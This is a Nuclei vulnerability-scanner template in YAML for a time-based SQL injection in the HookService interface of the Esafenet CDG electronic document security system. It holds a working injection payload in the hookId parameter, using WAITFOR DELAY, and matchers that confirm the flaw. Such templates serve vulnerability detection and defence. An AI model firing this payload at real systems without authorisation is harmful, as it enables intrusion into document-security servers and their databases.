id: esafenet-cdg-hookservice-sqli

info:
  name: Esafenet-CDG hookservice - SQL Injection
  author: qwtd
  severity: high
  description: |-
    亿赛通电子文档安全系统 HookService 接口存在延时注入
  reference:
    - https://flowus.cn/share/9d33a5d8-87b1-482b-8642-a8fcf27585ba?code=G8A6P3
    - https://blog.csdn.net/xc_214/article/details/143564948
  tags: 亿赛通-电子文档安全管理系统

http:
  - raw:
      - |
        GET /CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:5'--   HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Accept-Ldwk: bG91ZG9uZ3dlbmt1
        Accept-Language: zh-Hans-CN;q=1
        Connection: close
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36


    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'status_code == 404'
          - 'contains(body,"Freedom")'
        condition: and